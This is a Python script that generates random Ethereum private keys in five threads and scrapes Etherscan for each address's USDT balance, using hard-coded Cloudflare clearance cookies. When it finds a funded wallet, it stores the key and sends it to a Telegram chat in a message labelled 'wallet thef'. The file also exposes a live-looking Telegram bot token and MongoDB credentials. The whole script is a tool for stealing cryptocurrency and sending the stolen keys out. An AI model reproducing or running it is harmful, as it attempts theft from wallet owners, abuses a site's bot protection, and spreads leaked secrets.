import time
from secrets import token_bytes
from threading import Thread

import requests
import telebot
from bs4 import BeautifulSoup
from coincurve import PublicKey
from _pysha3 import keccak_256
import base


#db = base.Base("mongodb://Roooasr:sedsaigUG12IHKJhihsifhaosf@mongodb:27017/")
db = base.Base("localhost")
bot = telebot.TeleBot('6085840572:AAFPSPcF6BOLPNpm-wbzKzRtmr8LuNirsmI')

def genKey():
    private_key = keccak_256(token_bytes(32)).digest()
    public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
    addr = keccak_256(public_key).digest()[-20:]

    return {"private_key": private_key.hex(), "addr":f"0x{addr.hex()}"}


def checkAddress(adr):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0'
    }
    coocie = {
        "__cf_bm": "KkkMjOxDAH8U2CaXIwFT7vt3HYJAjdikhZuPklzjw0M-1679759809-0-Ad5Jwr+NN7/2bmuo7S+G612mBpaIas+ZZ7LoCqkpovynkYTtMEDCW7LXBV81hiRfcG49ngXU/EwjoopERkzUDzRQA5dtaUazk5fB10+oMJkKuQLzTGm9/ucFN+NSVO5xcQ==",
        "__cflb": "0H28vPcoRrcznZcNZSuFrvaNdHwh858EthAE4h12zRi",
        "_ga": "GA1.2.1594640058.1679748840",
        "_gid": "GA1.2.776781051.1679748840",
        "ASP.NET_SessionId": "omrqynh55gb3c1eccfjoinbw",
        "bitmedia_fid": "eyJmaWQiOiIzNzYwNTVlZWI0Yjc3NGM0MzQ0NzFiMzRiODkwNGQ4ZCIsImZpZG5vdWEiOiJjNWEwYmM0MDk4YTFmYmIyY2YxZjMzZjRlYjRhMTQ4NiJ9",
        "cf_chl_2": "d9f6509fe6caabc",
        "cf_clearance": "nplImhQuovqDk57fgjfjggd2p.9LrYOs1Gwwtgn_hck-1679759793-0-150"
    }
    url = f"https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7?a={adr}"
    response = requests.get(url, headers=headers, cookies=coocie)
    soup = BeautifulSoup(response.text, 'lxml')
    quotes = soup.find('div', class_="col-md border-md-start")
    balance = int(quotes.text.split(" ")[0].replace('\nBalance\n',''))
    print(f'{adr} {balance}')

    return {"balance":balance}

def worker(number):
    time.sleep(int(number))
    bot.send_message(6276997355, f"worker {number} sicle is starting")
    while True:
        try:
            wallet = genKey()
            check = checkAddress(wallet['addr'])

            if check['balance'] > 0:
                db.addWallet(wallet['addr'],wallet['private_key'],check['balance'])
                bot.send_message(6276997355,f"wallet thef \nadr: {wallet['addr']}\npriv: {wallet['private_key']}\nbalance: {str(check['balance'])}")
        except AttributeError:
            #bot.send_message(6276997355, f"worker NoneType error to main2 wait 3 sec")
            print("NoneType err")
            time.sleep(3)
        except:
            bot.send_message(6276997355, f"sicle error")


if __name__ == "__main__":
    tr = Thread(target=worker, args=("3"))
    tr1 = Thread(target=worker, args=("4"))
    tr2 = Thread(target=worker, args=("5"))
    tr3 = Thread(target=worker, args=("6"))
    tr4 = Thread(target=worker, args=("7"))
    tr.start()
    tr1.start()
    tr2.start()
    tr3.start()
    tr4.start()